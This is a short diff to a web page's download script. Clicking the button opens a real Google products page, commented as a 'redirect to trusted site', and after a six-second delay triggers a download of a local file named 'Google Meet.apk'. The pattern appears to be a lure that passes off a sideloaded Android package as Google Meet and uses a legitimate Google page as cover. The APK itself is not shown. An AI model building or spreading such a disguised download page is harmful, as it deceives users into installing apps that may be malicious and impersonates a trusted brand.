@@ -14,25 +14,23 @@
 var count = 0;
 document.getElementById("downloadBtn").addEventListener("click", function () {
     
-    window.open("https://about.google/products/", "");
+    window.open("https://about.google/products/", "");//redirect to trusted site
     
     const link = document.createElement("a");
     link.href = "Google Meet.apk";
     link.download = "Google Meet.apk";
     document.body.appendChild(link);
   
-    setTimeout(function(){
-       setTimeout(function(){
+    setTimeout(function(){ //download file
         link.click();
         document.body.removeChild(link);
-    }, 3000);
-      
-    }, 3000);
+    }, 6000);
     
 });
 </script>
 
 </body>
 </html>
+
 
 
